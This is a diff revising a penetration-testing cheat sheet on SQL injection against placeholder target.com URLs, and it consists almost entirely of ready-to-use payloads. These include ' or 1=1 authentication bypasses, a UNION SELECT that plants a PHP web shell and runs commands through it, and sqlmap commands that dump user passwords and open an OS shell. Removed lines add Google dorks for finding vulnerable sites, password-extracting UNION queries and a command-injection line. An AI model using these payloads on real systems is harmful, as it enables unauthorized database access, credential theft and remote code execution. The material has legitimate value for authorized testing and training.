@@ -1,37 +1,32 @@
 SQL Injection
 
 
-Check for SQLi by adding and single quote or the following: ‘ or 1=1--<space>
+SQL databases interpret the single quote character as the boundary between code and data. It assumes 
+that anything following a single quote is code that it needs to run and anything encapsulated by a 
+quote is data.
 
-http://www.target.com/index.php?val=100’ 
-http://www.target.com/index.php?val=100’ or ‘1’=’1 
+Check for SQLi by adding the following to the end of a URL:
+a single quote
+' or 1=1--<space>
 
-Username: ' or 1=1--<space>
-Password:
+http://www.target.com/index.php?id=100'
+http://www.target.com/index.php?id=100' or 1=1--<space>
 
-Try to login as a specific user.
-Username: bob
-Password: ' or (1=1 and username = 'bob')--<space>
-
-Database version
-Username: +convert(varchar,convert(int,@@version))+
+http://target.com/user.php?name=admin&password=summer2016
+http://target.com/user.php?name=admin' or 1=1-- &password=summer2016
 ------------------------------------------------------------------------------------------------------
 
 ?sql_query 
 
 If you are reading the source code for a web page and discover ?sql_query in the code, this format is 
 how HTTP GET parameters are passed through the URL. You can inject an SQL query as a HTTP GET parameter 
-to a server-side script. 
-
-Based on prior knowledge of a database table name (customers), you can inject a properly formatted SQL 
-query as an HTTP GET parameter.
+to a server-side script. Based on prior knowledge of a database table name (customers), you can inject 
+a properly formatted SQL query as a HTTP GET parameter.
 
 http://www.target.com/index.php?sql_query=SELECT * FROM customers
 ------------------------------------------------------------------------------------------------------
 
 # Remote code execution via time based blind SQLi
-
-https://www.youtube.com/watch?v=JZR8bDRl0t8
 
 - The 'title' parameter is vulnerable.
 http://target.com/item.php?title=1&action=search
@@ -44,47 +39,6 @@ http://target.com/item.php?title=a' UNION SELECT 1, "<?php system($_GET['cmd']) 
 
 - Run a command.
 http://target.com/shell.php?cmd=id
-------------------------------------------------------------------------------------------------------
-
-# Google Dorks
-
-inurl:index.php?id=
-inurl:gallery.php?id=
-inurl:article.php?id=
-inurl:pageid=
-------------------------------------------------------------------------------------------------------
-
-SQL databases interpret the single quote character as the boundary between code and data. It assumes that 
-anything following a single quote is code that it needs to run and anything encapsulated by a quote is data.
-
-Example: SELECT * FROM products WHERE price < '100' ORDER BY description;
-
-' and 1=0/@@version;--
-' and 1=0/user;--
-' having 1'='1
-' GROUPED BY productid having '1'='1
-' GROUPED BY productid,name having '1'='1
-------------------------------------------------------------------------------------------------------
-
-MS-SQL server concatenates numbers, it does not add them. '10' + '0' would equal 100 not 10.
- 
-SELECT * FROM table1 WHERE condition1
-union all
-
-SELECT * FROM table2 WHERE condition2
-
-OS - @@version
-  Server instances - @@servername
-    Databases
-      Tables
-        Columns
-
-SELECT name FROM master..sysdatabases
-------------------------------------------------------------------------------------------------------
-
-http://target.com/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))—
-http://target.com/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD+FROM+USERS
-Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
 ------------------------------------------------------------------------------------------------------
 
 sqlmap
@@ -129,6 +83,3 @@ sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
 --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump
 
 sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
-------------------------------------------------------------------------------------------------------
-
-SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
